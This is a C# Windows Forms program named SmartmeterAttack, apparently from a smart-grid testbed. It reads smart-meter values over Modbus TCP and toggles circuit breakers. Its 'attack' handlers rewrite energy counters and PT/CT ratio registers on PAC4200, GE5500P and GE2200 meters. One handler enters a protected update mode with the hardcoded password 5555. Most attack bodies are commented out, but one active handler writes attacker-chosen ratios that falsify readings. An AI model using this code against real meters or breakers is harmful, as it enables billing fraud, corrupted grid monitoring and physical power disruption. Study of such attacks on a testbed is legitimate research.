using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.SqlClient;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using Modbus.Device;
using Modbus.IO;
using Modbus.Data;
using log4net;
using log4net.Config;
using System.IO;
using System.Timers;
using static System.Net.Mime.MediaTypeNames;

namespace SmartmeterAttack
{
    public partial class Form1 : Form
    {
        const int SampleTime1 = 1;
        const int SampleTime2 = 1;
        private int modivalue = 0;
        public TCPSGInterface TcpMeter1;
        bool bIsOpen = false;
        private System.Windows.Forms.Timer timer;
        private Random random = new Random();
        private byte[] res = new byte[20];
        private int pt1 = 220, pt2 = 220, ct = 25;
        public Form1()
        {
            InitializeComponent();
            timer = new System.Windows.Forms.Timer();
            timer.Interval = 1000; // 设置定时器间隔为0.5秒
            timer.Tick += Timer_Tick;
            timer.Start();
            x = Width;
            y = Height;
            setTag(this);
            for (int i = 1; i <= 6; i++)
            {
                cgc(i, 0); cgb1(i, 0); cgb2(i, 0);
            }
            textBox13.Text = "100";
            comboBox1.SelectedIndex = 0;
            comboBox2.SelectedIndex = 0;
            button2.Enabled = false;
            button3.Enabled = false;
            button4.Enabled = false;
        }
        private readonly float x; //定义当前窗体的宽度
        private readonly float y; //定义当前窗体的高度

        private void setTag(Control cons)
        {
            foreach (Control con in cons.Controls)
            {
                con.Tag = con.Width + ";" + con.Height + ";" + con.Left + ";" + con.Top + ";" + con.Font.Size;
                if (con.Controls.Count > 0) setTag(con);
            }
        }

        private void setControls(float newx, float newy, Control cons)
        {
            //遍历窗体中的控件，重新设置控件的值
            foreach (Control con in cons.Controls)
                //获取控件的Tag属性值，并分割后存储字符串数组
                if (con.Tag != null)
                {
                    var mytag = con.Tag.ToString().Split(';');
                    //根据窗体缩放的比例确定控件的值
                    con.Width = Convert.ToInt32(Convert.ToSingle(mytag[0]) * newx); //宽度
                    con.Height = Convert.ToInt32(Convert.ToSingle(mytag[1]) * newy); //高度
                    con.Left = Convert.ToInt32(Convert.ToSingle(mytag[2]) * newx); //左边距
                    con.Top = Convert.ToInt32(Convert.ToSingle(mytag[3]) * newy); //顶边距
                    var currentSize = Convert.ToSingle(mytag[4]) * newy; //字体大小                   
                    if (currentSize > 0) con.Font = new Font(con.Font.Name, currentSize, con.Font.Style, con.Font.Unit);
                    con.Focus();
                    if (con.Controls.Count > 0) setControls(newx, newy, con);

                }
        }

        /// <summary>
        /// 重置窗体布局
        /// </summary>
        private void ReWinformLayout()
        {
            var newx = Width / x;
            var newy = Height / y;
            setControls(newx, newy, this);

        }

        private void Form1_Resize(object sender, EventArgs e)
        {
            ReWinformLayout();
        }
        unsafe private void Timer_Tick(object sender, EventArgs e)
        {
            label2.Text = DateTime.Now.ToString();
            if (bIsOpen)
            {
                ReadMeter();
            }
        }
        unsafe private void ReadMeter()
        {
            float vv, cc, pp;
            byte*[] add = new byte*[5];
            TcpMeter1.ReadHoldingRegisters(0x01, 0x0131, 0x0001, res);
            vv = ((res[0] << 8) + res[1]) * pt1 / pt2 / (float)10.0;
            v_1.Text = vv.ToString("0.00");
            TcpMeter1.ReadHoldingRegisters(0x01, 0x0139, 0x0001, res);
            cc = ((res[0] << 8) + res[1]) * ct / 5 / 1000;
            c_1.Text = cc.ToString("0.00");
            TcpMeter1.ReadHoldingRegisters(0x01, 0x0146, 0x0001, res);
            pp = ((res[0] << 8) + res[1]) * ct / 5; 
            p_1.Text = pp.ToString("0.00");
            ///////////////////////////////////////////////////////////////
            TcpMeter1.ReadHoldingRegisters(0x02, 0x0131, 0x0001, res);
            vv = ((res[0] << 8) + res[1]) * pt1 / pt2 / (float)10.0;
            v_2.Text = vv.ToString("0.00");
            TcpMeter1.ReadHoldingRegisters(0x02, 0x0139, 0x0001, res);
            cc = (float)((float)((res[0] << 8) + res[1])* (float)ct /5.0/1000.0);
            c_2.Text = cc.ToString("0.00");
            TcpMeter1.ReadHoldingRegisters(0x02, 0x0146, 0x0001, res);
            pp = (float)((float)((res[0] << 8) + res[1]) * (float)ct / 5.0);
            p_2.Text = pp.ToString("0.00");
            /////////////////////////////////////////////////////////////
            TcpMeter1.ReadHoldingRegisters(0x03, 1123, 0x0001, res);
            short vv3;
            add[0] = (byte*)(&vv3) + 1;
            add[1] = (byte*)(&vv3) + 0;
            *add[0] = res[0];
            *add[1] = res[1];
            v_3.Text = vv3.ToString("0.00");
            TcpMeter1.ReadHoldingRegisters(0x03, 1159, 0x0001, res);
            int ccc= (res[0] << 8) + res[1];
            if (ccc == 32768) pp = 0;
            else pp = ccc / 10.0f;
            
            p_3.Text = pp.ToString("0.00");
            c_3.Text = (pp / vv3).ToString("0.00");
            /////////////////////////////////////////////////////////////
            TcpMeter1.ReadHoldingRegisters(0x04, 1123, 0x0001, res);
            add[0] = (byte*)(&vv3) + 1;
            add[1] = (byte*)(&vv3) + 0;
            *add[0] = res[0];
            *add[1] = res[1];
            v_4.Text = vv3.ToString("0.00");
            TcpMeter1.ReadHoldingRegisters(0x04, 1159, 0x0001, res);
            ccc = (res[0] << 8) + res[1];
            if (ccc == 32768) pp = 0;
            else pp = ccc / 10.0f;
            p_4.Text = pp.ToString("0.00");
            c_4.Text = (pp/vv3).ToString("0.00");
            /////////////////////////////////////////////////////////////
            TcpMeter1.ReadHoldingRegisters(0x05, 0x0001, 0x0002, res);
            add[0] = (byte*)(&vv) + 3;
            add[1] = (byte*)(&vv) + 2;
            add[2] = (byte*)(&vv) + 1;
            add[3] = (byte*)(&vv);
            *add[0] = res[0];
            *add[1] = res[1];
            *add[2] = res[2];
            *add[3] = res[3];
            v_5.Text = vv.ToString("0.00");
            TcpMeter1.ReadHoldingRegisters(0x05, 13, 0x0002, res);
            add[0] = (byte*)(&cc) + 3;
            add[1] = (byte*)(&cc) + 2;
            add[2] = (byte*)(&cc) + 1;
            add[3] = (byte*)(&cc);
            *add[0] = res[0];
            *add[1] = res[1];
            *add[2] = res[2];
            *add[3] = res[3];
            c_5.Text = cc.ToString("0.00");
            TcpMeter1.ReadHoldingRegisters(0x05, 63, 0x0002, res);
            add[0] = (byte*)(&pp) + 3;
            add[1] = (byte*)(&pp) + 2;
            add[2] = (byte*)(&pp) + 1;
            add[3] = (byte*)(&pp);
            *add[0] = res[0];
            *add[1] = res[1];
            *add[2] = res[2];
            *add[3] = res[3];
            p_5.Text = pp.ToString("0.00");
            //////////////////////////////////////////////////////////////////////////////
            TcpMeter1.ReadHoldingRegisters(0x06, 0x0001, 0x0002, res);
            add[0] = (byte*)(&vv) + 3;
            add[1] = (byte*)(&vv) + 2;
            add[2] = (byte*)(&vv) + 1;
            add[3] = (byte*)(&vv);
            *add[0] = res[0];
            *add[1] = res[1];
            *add[2] = res[2];
            *add[3] = res[3];
            v_6.Text = vv.ToString("0.00");
            TcpMeter1.ReadHoldingRegisters(0x06, 13, 0x0002, res);
            add[0] = (byte*)(&cc) + 3;
            add[1] = (byte*)(&cc) + 2;
            add[2] = (byte*)(&cc) + 1;
            add[3] = (byte*)(&cc);
            *add[0] = res[0];
            *add[1] = res[1];
            *add[2] = res[2];
            *add[3] = res[3];
            c_6.Text = cc.ToString("0.00");
            TcpMeter1.ReadHoldingRegisters(0x06, 63, 0x0002, res);
            add[0] = (byte*)(&pp) + 3;
            add[1] = (byte*)(&pp) + 2;
            add[2] = (byte*)(&pp) + 1;
            add[3] = (byte*)(&pp);
            *add[0] = res[0];
            *add[1] = res[1];
            *add[2] = res[2];
            *add[3] = res[3];
            p_6.Text = pp.ToString("0.00");
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            
        }
        
        private void cgc(int num,int stat)
        {
            if(stat==0)
            {
                switch(num)
                {
                    case 1:
                        textBox_11.ForeColor = Color.Red;
                        textBox_12.ForeColor = Color.Red;
                        break;
                    case 2:
                        textBox_21.ForeColor = Color.Red;
                        textBox_22.ForeColor = Color.Red;
                        break;
                    case 3:
                        textBox_31.ForeColor = Color.Red;
                        textBox_32.ForeColor = Color.Red;
                        break;
                    case 4:
                        textBox_41.ForeColor = Color.Red;
                        textBox_42.ForeColor = Color.Red;
                        break;
                    case 5:
                        textBox_51.ForeColor = Color.Red;
                        textBox_52.ForeColor = Color.Red;
                        break;
                    case 6:
                        textBox_61.ForeColor = Color.Red;
                        textBox_62.ForeColor = Color.Red;
                        break;
                }
            }
            else if (stat == 1)
            {
                switch (num)
                {
                    case 1:
                        textBox_11.ForeColor = Color.Green;
                        textBox_12.ForeColor = Color.Green;
                        break;
                    case 2:
                        textBox_21.ForeColor = Color.Green;
                        textBox_22.ForeColor = Color.Green;
                        break;
                    case 3:
                        textBox_31.ForeColor = Color.Green;
                        textBox_32.ForeColor = Color.Green;
                        break;
                    case 4:
                        textBox_41.ForeColor = Color.Green;
                        textBox_42.ForeColor = Color.Green;
                        break;
                    case 5:
                        textBox_51.ForeColor = Color.Green;
                        textBox_52.ForeColor = Color.Green;
                        break;
                    case 6:
                        textBox_61.ForeColor = Color.Green;
                        textBox_62.ForeColor = Color.Green;
                        break;
                }
            }
        }
        private void cgb1(int num, int stat)
        {
            if (stat == 0)
            {
                switch (num)
                {
                    case 1:
                        button_11.Enabled=false;
                        break;
                    case 2:
                        button_21.Enabled = false;
                        break;
                    case 3:
                        button_31.Enabled = false;
                        break;
                    case 4:
                        button_41.Enabled = false;
                        break;
                    case 5:
                        button_51.Enabled = false;
                        break;
                    case 6:
                        button_61.Enabled = false;
                        break;
                }
            }
            else if (stat == 1)
            {
                switch (num)
                {
                    case 1:
                        button_11.Enabled = true;
                        break;
                    case 2:
                        button_21.Enabled = true;
                        break;
                    case 3:
                        button_31.Enabled = true;
                        break;
                    case 4:
                        button_41.Enabled = true;
                        break;
                    case 5:
                        button_51.Enabled = true;
                        break;
                    case 6:
                        button_61.Enabled = true;
                        break;
                }
            }
        }
        private void cgb2(int num, int stat)
        {
            if (stat == 0)
            {
                switch (num)
                {
                    case 1:
                        button_12.Enabled = false;
                        break;
                    case 2:
                        button_22.Enabled = false;
                        break;
                    case 3:
                        button_32.Enabled = false;
                        break;
                    case 4:
                        button_42.Enabled = false;
                        break;
                    case 5:
                        button_52.Enabled = false;
                        break;
                    case 6:
                        button_62.Enabled = false;
                        break;
                }
            }
            else if (stat == 1)
            {
                switch (num)
                {
                    case 1:
                        button_12.Enabled = true;
                        break;
                    case 2:
                        button_22.Enabled = true;
                        break;
                    case 3:
                        button_32.Enabled = true;
                        break;
                    case 4:
                        button_42.Enabled = true;
                        break;
                    case 5:
                        button_52.Enabled = true;
                        break;
                    case 6:
                        button_62.Enabled = true;
                        break;
                }
            }
        }
        private void button1_Click(object sender, EventArgs e)
        {
            if (bIsOpen == false)//disconnect--->connect
            {
                try
                {
                    TcpMeter1 = new TCPSGInterface("192.168.1.254");
                    bIsOpen = true;
                    for (int i = 1; i <= 6; i++)
                    {
                        cgc(i, 1);
                        cgb1(i, 1);
                        cgb2(i, 0);
                    }
                    button2.Enabled = true;
                    button3.Enabled = true;
                    button4.Enabled = true;
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
            }
            else
            {//conncet--->disconnect
                try
                {
                    TcpMeter1.close();
                    bIsOpen = false;
                    for (int i = 1; i <= 6; i++)
                    {
                        cgc(i, 0);
                        cgb1(i, 0);
                        cgb2(i, 0);
                    }
                    button2.Enabled = false;
                    button3.Enabled = false;
                    button4.Enabled = false;

                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
            }

            button1.Text = bIsOpen ? "断开" : "电表连接";
            
        }

        private void textBox1_TextChanged_1(object sender, EventArgs e)
        {

        }

        //攻击PAC4200
        private void button2_Click(object sender, EventArgs e)
        {

         /*
            double E11new =  500000;
            double E12new = 1500000;
            double E21new = 1500000;
            double E22new =  500000;
            
            byte[] bholdregs1 = new byte[8];
            byte[] bholdregs2 = new byte[8];
            byte[] bholdregs3 = new byte[8];
            byte[] bholdregs4 = new byte[8];
            bholdregs1 = BitConverter.GetBytes(E11new);
            Array.Reverse(bholdregs1, 0, 8);
            bholdregs2 = BitConverter.GetBytes(E12new);
            Array.Reverse(bholdregs2, 0, 8);
            bholdregs3 = BitConverter.GetBytes(E21new);
            Array.Reverse(bholdregs3, 0, 8);
            bholdregs4 = BitConverter.GetBytes(E22new);
            Array.Reverse(bholdregs4, 0, 8);
            TcpMeter1.WriteMultipleRegisters(801, bholdregs1);
            TcpMeter1.WriteMultipleRegisters(805, bholdregs2);
            TcpMeter2.WriteMultipleRegisters(801, bholdregs3);
            TcpMeter2.WriteMultipleRegisters(805, bholdregs4);*/
           
        }

        //攻击GE5500P
        private void button3_Click(object sender, EventArgs e)
        {
            /*
            //ushort Pass = 5555; CT=25，PT1=220，PT2=220
            ushort CT1_1new = 25;
            UInt32 PT1_1new = 2200;
            ushort PT1_2new = 220;
            ushort CT2_1new = 250;
            UInt32 PT2_1new = 220;
            ushort PT2_2new = 220;
            byte slaveID1 = 7;
            byte slaveID2 = 8;

            byte[] bholdregs1_5 = new byte[4];
            byte[] bholdregs1_6 = new byte[2];
            byte[] bholdregs1_7 = new byte[2];
            byte[] bholdregs1_8 = new byte[4];
            byte[] bholdregs1_9 = new byte[2];
            byte[] bholdregs1_10 = new byte[2];
            bholdregs1_5 = BitConverter.GetBytes(PT1_1new);
            Array.Reverse(bholdregs1_5, 0, 4);
            bholdregs1_6 = BitConverter.GetBytes(CT1_1new);
            Array.Reverse(bholdregs1_6, 0, 2);
            bholdregs1_7 = BitConverter.GetBytes(PT1_2new);
            Array.Reverse(bholdregs1_7, 0, 2);
            bholdregs1_8 = BitConverter.GetBytes(PT2_1new);
            Array.Reverse(bholdregs1_8, 0, 4);
            bholdregs1_9 = BitConverter.GetBytes(CT2_1new);
            Array.Reverse(bholdregs1_9, 0, 2);
            bholdregs1_10 = BitConverter.GetBytes(PT2_2new);
            Array.Reverse(bholdregs1_10, 0, 2);
            TcpMeter3.WriteMultipleRegistersQ(slaveID1, 261, bholdregs1_5);
            TcpMeter3.WriteMultipleRegistersP(slaveID1, 264, bholdregs1_6);
            TcpMeter3.WriteMultipleRegistersP(slaveID1, 263, bholdregs1_7);
            TcpMeter3.WriteMultipleRegistersQ(slaveID2, 261, bholdregs1_8);
            TcpMeter3.WriteMultipleRegistersP(slaveID2, 264, bholdregs1_9);
            TcpMeter3.WriteMultipleRegistersP(slaveID2, 263, bholdregs1_10);
            */

        }

        //攻击GE2200
        private void button4_Click(object sender, EventArgs e)
        {
            /*
            ushort Pass = 5555;
            ushort CT1new = 25;
            ushort PT1new = 240;
            ushort checksum;
            byte slaveID3 = 3;

            byte[] bholdregs11 = new byte[2];


            TcpMeter3.WriteSingleRegisters(slaveID3, 21999, Pass);// in PS update mode
            TcpMeter3.WriteSingleRegisters(slaveID3, 30000, CT1new);
            TcpMeter3.WriteSingleRegisters(slaveID3, 30001, PT1new);
            TcpMeter3.ReadHoldingRegisters(slaveID3, 22001, 1, bholdregs11);
            Array.Reverse(bholdregs11, 0, 2);
            checksum = BitConverter.ToUInt16(bholdregs11, 0);
            TcpMeter3.WriteSingleRegisters(slaveID3, 22002, checksum);
            TcpMeter3.WriteSingleRegisters(slaveID3, 22000, checksum);// out PS update mode
            */

        }



        //重置所有电表
        private void button5_Click(object sender, EventArgs e)
        {
            //resetPAC4200();
            //resetGE5500P();
            //resetGE2200();
        }

        private void button6_Click(object sender, EventArgs e)
        {
            //resetPAC4200();
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void button7_Click(object sender, EventArgs e)
        {
           // resetGE5500P();
        }

        private void button8_Click(object sender, EventArgs e)
        {
           // resetGE2200();
        }

        private void groupBox1_Enter(object sender, EventArgs e)
        {

        }


        private void groupBox2_Enter(object sender, EventArgs e)
        {

        }

        private void groupBox2_Enter_1(object sender, EventArgs e)
        {

        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox3_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox8_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox13_TextChanged(object sender, EventArgs e)
        {
            
        }

        private void textBox5_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox15_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox7_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox6_TextChanged(object sender, EventArgs e)
        {

        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void dataGridView1_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {

        }

        private void tableLayoutPanel1_Paint(object sender, PaintEventArgs e)
        {
            
        }

        private void textBox2_TextChanged_1(object sender, EventArgs e)
        {

        }

        private void textBox9_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox23_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox16_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox4_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox5_TextChanged_1(object sender, EventArgs e)
        {

        }

        private void textBox6_TextChanged_1(object sender, EventArgs e)
        {

        }

        private void v_1_TextChanged(object sender, EventArgs e)
        {

        }

        private void p_2_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox10_TextChanged(object sender, EventArgs e)
        {

        }

        private void trackBar1_Scroll(object sender, EventArgs e)
        {
            textBox13.Text = trackBar1.Value.ToString();
        }

        private void button_61_Click(object sender, EventArgs e)
        {
            TcpMeter1.WriteBreaker(12, 0);
            cgc(6, 0);
            cgb1(6, 0);
            cgb2(6, 1);
        }

        private void button_62_Click(object sender, EventArgs e)
        {
            /*this tm why one more*/
        }

        private void button_62_Click_1(object sender, EventArgs e)
        {
            TcpMeter1.WriteBreaker(12, 1);
            cgc(6, 1);
            cgb1(6, 1);
            cgb2(6, 0);
        }

        private void button_51_Click(object sender, EventArgs e)
        {
            TcpMeter1.WriteBreaker(11, 0);
            cgc(5, 0);
            cgb1(5, 0);
            cgb2(5, 1);
        }

        private void button_52_Click(object sender, EventArgs e)
        {
            TcpMeter1.WriteBreaker(11, 1);
            cgc(5, 1);
            cgb1(5, 1);
            cgb2(5, 0);
        }

        private void button_41_Click(object sender, EventArgs e)
        {
            TcpMeter1.WriteBreaker(10, 0);
            cgc(4, 0);
            cgb1(4, 0);
            cgb2(4, 1);
        }

        private void button_42_Click(object sender, EventArgs e)
        {
            TcpMeter1.WriteBreaker(10, 1);
            cgc(4, 1);
            cgb1(4, 1);
            cgb2(4, 0);
        }

        private void button_31_Click(object sender, EventArgs e)
        {
            TcpMeter1.WriteBreaker(9, 0);
            cgc(3, 0);
            cgb1(3, 0);
            cgb2(3, 1);
        }

        private void button_21_Click(object sender, EventArgs e)
        {
            TcpMeter1.WriteBreaker(8, 0);
            cgc(2, 0);
            cgb1(2, 0);
            cgb2(2, 1);
        }

        private void button_32_Click(object sender, EventArgs e)
        {
            TcpMeter1.WriteBreaker(9, 1);
            cgc(3, 1);
            cgb1(3, 1);
            cgb2(3, 0);
        }

        private void button_22_Click(object sender, EventArgs e)
        {
            TcpMeter1.WriteBreaker(8, 1);
            cgc(2, 1);
            cgb1(2, 1);
            cgb2(2, 0);
        }

        private void button_11_Click(object sender, EventArgs e)
        {
            TcpMeter1.WriteBreaker(7, 0);
            cgc(1, 0);
            cgb1(1, 0);
            cgb2(1, 1);
        }

        private void button_12_Click(object sender, EventArgs e)
        {
            TcpMeter1.WriteBreaker(7, 1);
            cgc(1, 1);
            cgb1(1, 1);
            cgb2(1, 0);
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (comboBox1.SelectedIndex == 2)
            {
                trackBar1.Minimum = 5;
                trackBar1.Maximum = 10000;
                trackBar1.TickFrequency = 1000;
                textBox14.Text = "5-10000";
            }
            else if (comboBox1.SelectedIndex == 1)
            {
                trackBar1.Minimum = 100;
                trackBar1.Maximum = 50000;
                trackBar1.TickFrequency = 5000;
                textBox14.Text = "100-50000";
            }
            else if(comboBox1.SelectedIndex == 0)
            {
                trackBar1.Minimum = 100;
                trackBar1.Maximum = 50000;
                trackBar1.TickFrequency = 5000;
                textBox14.Text = "100-50000";
            }
            trackBar1.Value = trackBar1.Minimum;
        }
        private void textBox13_TextChanged_1(object sender, EventArgs e)
        {
            //v_4.Text = textBox13.TextLength.ToString();
            int.TryParse(textBox13.Text, out int Value);
            //v_4.Text = Value.ToString();
            if (Value > trackBar1.Maximum) textBox13.Text = trackBar1.Maximum.ToString();
            if (Value >= trackBar1.Minimum && Value <= trackBar1.Maximum)
            {
                trackBar1.Value = Value;
            }
        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void button2_Click_1(object sender, EventArgs e)
        {
            if(comboBox1.SelectedIndex==0)
            {
                if(comboBox2.SelectedIndex==1||comboBox2.SelectedIndex==0)
                {
                    int item = comboBox2.SelectedIndex + 1;
                    UInt32 PT1_1new = (UInt32)trackBar1.Value;

                    byte[] bholdregs1_5 = new byte[4];
                    byte[] bholdregs1_6 = new byte[2];
                    byte[] bholdregs1_7 = new byte[2];

                    bholdregs1_5 = BitConverter.GetBytes(PT1_1new);
                    Array.Reverse(bholdregs1_5, 0, 4);
                    TcpMeter1.WriteMultipleRegistersQ((byte)item, 261, bholdregs1_5);
                }
            }
            else if (comboBox1.SelectedIndex == 1)
            {
                if (comboBox2.SelectedIndex == 1 || comboBox2.SelectedIndex == 0)
                {
                    int item = comboBox2.SelectedIndex + 1;
                    ushort PT1_2new = (ushort)trackBar1.Value;

                    byte[] bholdregs1_5 = new byte[4];
                    byte[] bholdregs1_6 = new byte[2];
                    byte[] bholdregs1_7 = new byte[2];

                    bholdregs1_7 = BitConverter.GetBytes(PT1_2new);
                    Array.Reverse(bholdregs1_7, 0, 2);
                    TcpMeter1.WriteMultipleRegistersP((byte)item, 263, bholdregs1_7);
                }
            }
            else if (comboBox1.SelectedIndex == 2)
            {
                if (comboBox2.SelectedIndex == 1 || comboBox2.SelectedIndex == 0)
                {
                    int item = comboBox2.SelectedIndex + 1;
                    ushort CT1_1new = (ushort)trackBar1.Value;

                    byte[] bholdregs1_5 = new byte[4];
                    byte[] bholdregs1_6 = new byte[2];
                    byte[] bholdregs1_7 = new byte[2];

                    bholdregs1_6 = BitConverter.GetBytes(CT1_1new);
                    Array.Reverse(bholdregs1_6, 0, 2);

                    TcpMeter1.WriteMultipleRegistersP((byte)item, 264, bholdregs1_6);
                }
            }
        }

        private void button5_Click_1(object sender, EventArgs e)
        {

        }

        private void textBox11_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox14_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
